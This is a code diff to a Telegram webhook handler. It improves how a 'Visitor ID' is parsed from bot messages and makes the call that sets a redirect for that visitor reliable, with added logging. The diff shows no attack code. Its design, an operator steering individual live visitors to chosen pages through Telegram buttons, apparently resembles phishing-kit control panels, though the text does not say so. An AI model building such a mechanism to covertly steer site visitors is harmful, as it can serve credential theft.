@@ -34,13 +34,24 @@ export default async function handler(req, res) {
         
         // Extract visitor ID from message text (try multiple patterns)
         const messageText = callback.message.text || callback.message.caption || '';
+        console.log('[telegram] Full message object:', JSON.stringify(callback.message, null, 2));
         console.log('[telegram] Message text:', messageText);
         
+        // Try multiple patterns to extract visitor ID
         let visitorId = messageText.match(/Visitor ID: <code>(.*?)<\/code>/)?.[1] ||
-                       messageText.match(/Visitor ID: (.*?)\n/)?.[1] ||
-                       messageText.match(/Visitor ID: (.*?)$/m)?.[1];
+                       messageText.match(/Visitor ID: <code>(.*?)<\/code>/i)?.[1] ||
+                       messageText.match(/Visitor ID:\s*<code>(.*?)<\/code>/)?.[1] ||
+                       messageText.match(/Visitor ID:\s*(.*?)\n/)?.[1] ||
+                       messageText.match(/Visitor ID:\s*(.*?)$/m)?.[1] ||
+                       messageText.match(/Visitor ID:\s*(.*?)(?:\n|$)/)?.[1];
+        
+        // Clean up visitor ID (remove HTML entities if any)
+        if (visitorId) {
+          visitorId = visitorId.trim().replace(/&lt;/g, '<').replace(/&gt;/g, '>');
+        }
         
         console.log('[telegram] Extracted visitor ID:', visitorId);
+        console.log('[telegram] Visitor ID length:', visitorId?.length);
         
         // Answer callback query immediately (don't wait)
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -56,33 +67,62 @@ export default async function handler(req, res) {
         
         if (visitorId) {
           try {
-            const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 
-                           (req.headers.host ? `https://${req.headers.host}` : 'http://localhost:3000');
+            // Determine base URL - use production URL if available, otherwise detect from request
+            let baseUrl = process.env.NEXT_PUBLIC_APP_URL;
+            if (!baseUrl) {
+              // Try to detect from request headers
+              const protocol = req.headers['x-forwarded-proto'] || 'https';
+              const host = req.headers['x-forwarded-host'] || req.headers.host;
+              baseUrl = host ? `${protocol}://${host}` : 'https://your-project.vercel.app';
+            }
             
             console.log('[telegram] Calling redirect/set API:', `${baseUrl}/api/redirect/set`);
+            console.log('[telegram] Sending redirect command:', {
+              visitorId,
+              redirectType,
+              pagePath,
+              baseUrl
+            });
             
-            // Store redirect command (don't await - fire and forget for speed)
-            fetch(`${baseUrl}/api/redirect/set`, {
+            // Store redirect command - AWAIT to ensure it completes
+            const redirectResponse = await fetch(`${baseUrl}/api/redirect/set`, {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
+              headers: { 
+                'Content-Type': 'application/json',
+                'User-Agent': 'Telegram-Bot-Webhook'
+              },
               body: JSON.stringify({
-                visitorId: visitorId,
+                visitorId: visitorId.trim(),
                 redirectType: redirectType,
                 pagePath: pagePath
               })
-            }).then(async (response) => {
-              const result = await response.json();
-              console.log('[telegram] Redirect set response:', result);
-            }).catch(error => {
-              console.error('[telegram] Error storing redirect:', error);
             });
+            
+            if (!redirectResponse.ok) {
+              const errorText = await redirectResponse.text();
+              console.error('[telegram] Redirect set failed:', redirectResponse.status, errorText);
+              await sendTelegramMessage(
+                `❌ Error: Failed to set redirect (${redirectResponse.status})`,
+                chatId
+              );
+            } else {
+              const redirectResult = await redirectResponse.json();
+              console.log('[telegram] ✅ Redirect set successfully:', redirectResult);
+              console.log('[telegram] Redirect will be picked up by polling within 100ms');
+            }
           } catch (error) {
             console.error('[telegram] Error in redirect setup:', error);
+            console.error('[telegram] Error stack:', error.stack);
+            await sendTelegramMessage(
+              `❌ Error: ${error.message}`,
+              chatId
+            );
           }
         } else {
-          console.error('[telegram] Could not extract visitor ID from message');
+          console.error('[telegram] ❌ Could not extract visitor ID from message');
+          console.error('[telegram] Message text was:', messageText);
           await sendTelegramMessage(
-            `❌ Error: Could not find visitor ID in message`,
+            `❌ Error: Could not find visitor ID in message. Message: ${messageText.substring(0, 100)}`,
             chatId
           );
         }
